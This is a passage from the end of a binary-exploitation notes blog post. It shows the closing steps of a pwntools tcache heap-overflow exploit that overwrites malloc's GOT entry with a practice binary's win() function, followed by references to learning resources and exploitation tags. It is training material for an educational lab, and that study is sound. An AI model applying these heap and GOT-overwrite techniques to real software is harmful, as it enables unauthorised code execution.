</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 3: Overflow chunk 0 to overwrite the fd pointer in tcache</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Overwrite it with the GOT entry of malloc</span>
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">0</span>, cyclic(<span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> pack(exe<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;malloc&#39;</span>]))  <span style="color:#75715e"># Fix: use exe.got[&#39;malloc&#39;]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 4: Allocate two more chunks</span>
</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">8</span>)  <span style="color:#75715e"># chunk 1 again, pulled from tcache</span>
</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">8</span>)  <span style="color:#75715e"># chunk 2 ‚Äî this one is at exe.got[&#39;malloc&#39;]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 5: Overwrite malloc GOT entry with the address of win()</span>
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">3</span>, pack(exe<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;win&#39;</span>]))  <span style="color:#75715e"># chunk 2 = GOT entry of malloc</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 6: Trigger the overwritten malloc to call win()</span>
</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">8</span>)  <span style="color:#75715e"># malloc now jumps to win()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="cya">Cya!</h1>
<p><img src="/img/what.png" alt="what"></p>
<hr>
<h2 id="references"><em>References</em></h2>
<p><a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN">Live Overflow</a>
<a href="https://www.youtube.com/watch?v=ozMQBwPFLHk&amp;list=PL-DxAN1jsRa_rO0pr-1uJR_k_5Y9n-V1i">Software Security The Cyber Expert</a>
<a href="https://exploit.education/nebula">Exploit.Education</a>
<a href="https://github.com/Hellsender01/Youtube/tree/main/Binary%20Exploitation">Files</a>
<a href="https://academy.hackthebox.com/dashboard">HackTheBox Academy</a>
<a href="https://chatgpt.com/">GPT</a></p>
        </section>
        <div class="post-tags">
          
          
          <nav class="nav tags">
            <ul class="tags">
              
              <li><a href="/tags/binary-exploitation">Binary Exploitation</a></li>
              
              <li><a href="/tags/command-injection">Command Injection</a></li>
              
              <li><a href="/tags/stack-overflow">Stack Overflow</a></li>
              
              <li><a href="/tags/ret2shellcode">Ret2Shellcode</a></li>
              
              <li><a href="/tags/rop">ROP</a></li>
              
              <li><a href="/tags/ret2plt">Ret2PLT</a></li>
              
              <li><a href="/tags/ret2syscall">Ret2Syscall</a></li>
              
              <li><a href="/tags/aslr">ASLR</a></li>
              
              <li><a href="/tags/ret2libc">Ret2Libc</a></li>
              
              <li><a href="/tags/plt-got">PLT &amp; GOT</a></li>
              
              <li><a href="/tags/ret2csu">Ret2CSU</a></li>
              
              <li><a href="/tags/stack-pivoting">Stack Pivoting</a></li>
              
              <li><a href="/tags/srop">SROP</a></li>
              
              <li><a href="/tags/format-string">Format String</a></li>
              
              <li><a href="/tags/got-overwrite">GOT Overwrite</a></li>
              
              <li><a href="/tags/bad-characters">Bad Characters</a></li>
              
              <li><a href="/tags/heap">Heap</a></li>
              
              <li><a href="/tags/tcache">Tcache</a></li>
              
              <li><a href="/tags/use-after-free">Use After Free</a></li>
              
              <li><a href="/tags/double-free">Double Free</a></li>
              
              <li><a href="/tags/heap-overflow">Heap Overflow</a></li>
              
              <li><a href="/tags/pwn">PWN</a></li>
              
              <li><a href="/tags/notes">Notes</a></li>
              
            </ul>
          </nav>
          
          
        </div>
      </div>

      
      
    </div>

    </article>
</main>
<footer>
  <div style="display:flex;"></div>
  <div class="footer-info">
    2025  @deadcats.space 
  </div>
</footer>

</div>
    </body>
</html>
